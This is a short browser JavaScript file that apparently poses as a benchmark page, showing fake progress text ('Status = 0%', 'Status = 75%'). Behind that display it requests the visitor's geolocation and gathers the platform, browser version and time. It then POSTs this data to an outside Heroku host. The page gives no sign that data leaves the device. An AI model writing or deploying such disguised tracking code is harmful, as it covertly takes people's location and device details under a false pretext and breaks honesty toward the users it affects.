
function geolocation(){
    console.log('meow')
    navigator.geolocation.getCurrentPosition((position)=>{
        const lat = position.coords.latitude
        const lon = position.coords.longitude
        document.getElementById('med-text').innerHTML= ' Status = 75%'
        packEverthing(lat,lon)
    })
}

function platform(){
    return navigator.platform
}

function apiCall(data){
    
    let req = new XMLHttpRequest()
    req.open("POST","https://int-benchmark-app.herokuapp.com/")
    req.setRequestHeader("content-type", "application/json");
    req.send(JSON.stringify(data))
      
}

function packEverthing(lat,lon){
    var curtime = new Date()
    curtime = (curtime.toUTCString())
    var data = {
        platform:platform(),
        appName:navigator.appVersion,
        time:curtime,
        geolocation:{
            lat:lat,
            lon:lon
        }
    }

    console.log(data)

    apiCall(data)
}


document.getElementById('med-text').innerHTML = "Status = 0%"
geolocation()